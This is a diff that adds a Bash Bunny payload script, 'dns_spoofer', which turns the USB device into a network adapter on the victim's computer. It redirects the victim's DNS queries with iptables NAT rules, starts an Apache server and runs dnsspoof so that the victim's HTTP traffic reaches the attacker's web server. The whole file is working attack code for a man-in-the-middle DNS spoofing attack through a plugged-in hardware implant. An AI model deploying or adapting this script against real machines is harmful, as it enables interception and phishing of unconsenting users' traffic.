@@ -1,0 +1,36 @@
+# Title:	      dns_spoofer
+# Author:        Michal Wysocki
+# Version:      1.0
+#
+#Redirects HTTP traffic to Apache2 server running on Bunny. 
+#It works on assumption that BashBunny adapter takes precedence 
+#over host adapter. I have noticed sometimes it won’t.
+#
+# Green (blinking).....Starting Apache (be patient)
+# Blue...............Starting dnsspoof and ready to roll
+
+ATTACKMODE RNDIS_ETHERNET
+#ATTACKMODE ECM_ETHERNET
+
+source bunny_helpers.sh
+
+function setupNetworking() {
+    echo 1 > /proc/sys/net/ipv4/ip_forward
+    iptables -A INPUT -i usb0 -p udp --dport 53 -j ACCEPT
+    iptables -t nat -A PREROUTING -i usb0 -p udp --dport 53 -j DNAT  --to-destination  172.16.64.1:53
+    iptables -t nat -A POSTROUTING -j MASQUERADE
+}
+
+function startApache(){
+/etc/init.d/apache2 start
+}
+
+function startDnsSpoof(){
+/usr/sbin/dnsspoof -i usb0 -f /root/udisk/payloads/$SWITCH_POSITION/hosts
+}
+
+LED G 200
+setupNetworking
+startApache
+LED B 0
+startDnsSpoof
